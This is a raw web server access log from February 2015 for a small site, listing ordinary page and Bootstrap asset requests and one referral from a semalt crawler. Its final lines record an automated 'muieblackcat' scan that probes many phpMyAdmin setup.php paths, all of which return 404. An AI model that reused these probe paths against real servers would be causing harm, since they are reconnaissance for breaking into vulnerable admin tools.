177.0.118.250 - - [03/Feb/2015:11:29:00 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
177.0.118.250 - - [03/Feb/2015:11:29:00 -0500] "GET /dist/js/bootstrap.min.js HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
177.0.118.250 - - [03/Feb/2015:11:29:00 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
200.247.160.130 - - [03/Feb/2015:12:05:57 -0500] "GET / HTTP/1.1" 200 - "http://semalt.semalt.com/crawler.php?u=http://euterpea.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
200.247.160.130 - - [03/Feb/2015:12:05:58 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
200.247.160.130 - - [03/Feb/2015:12:05:58 -0500] "GET /starter-template.css HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
200.247.160.130 - - [03/Feb/2015:12:05:58 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
200.247.160.130 - - [03/Feb/2015:12:05:58 -0500] "GET /dist/js/bootstrap.min.js HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
200.247.160.130 - - [03/Feb/2015:12:05:58 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
185.35.62.11 - - [03/Feb/2015:12:56:27 -0500] "HEAD / HTTP/1.1" 200 - - "-"
192.111.152.2 - - [03/Feb/2015:14:00:21 -0500] "GET /muieblackcat HTTP/1.1" 404 - - "-"
192.111.152.2 - - [03/Feb/2015:14:00:21 -0500] "GET //scripts/setup.php HTTP/1.1" 404 - - "-"
192.111.152.2 - - [03/Feb/2015:14:00:21 -0500] "GET //admin/scripts/setup.php HTTP/1.1" 404 - - "-"
192.111.152.2 - - [03/Feb/2015:14:00:21 -0500] "GET //admin/pma/scripts/setup.php HTTP/1.1" 404 - - "-"
192.111.152.2 - - [03/Feb/2015:14:00:21 -0500] "GET //admin/phpmyadmin/scripts/setup.php HTTP/1.1" 404 - - "-"
192.111.152.2 - - [03/Feb/2015:14:00:21 -0500] "GET //db/scripts/setup.php HTTP/1.1" 404 - - "-"
192.111.152.2 - - [03/Feb/2015:14:00:21 -0500] "GET //dbadmin/scripts/setup.php HTTP/1.1" 404 - - "-"
192.111.152.2 - - [03/Feb/2015:14:00:21 -0500] "GET //myadmin/scripts/setup.php HTTP/1.1" 404 - - "-"
192.111.152.2 - - [03/Feb/2015:14:00:21 -0500] "GET //mysql/scripts/setup.php HTTP/1.1" 404 - - "-"
192.111.152.2 - - [03/Feb/2015:14:00:21 -0500] "GET //mysqladmin/scripts/setup.php HTTP/1.1" 404 - - "-"
192.111.152.2 - - [03/Feb/2015:14:00:21 -0500] "GET //typo3/phpmyadmin/scripts/setup.php HTTP/1.1" 404 - - "-"
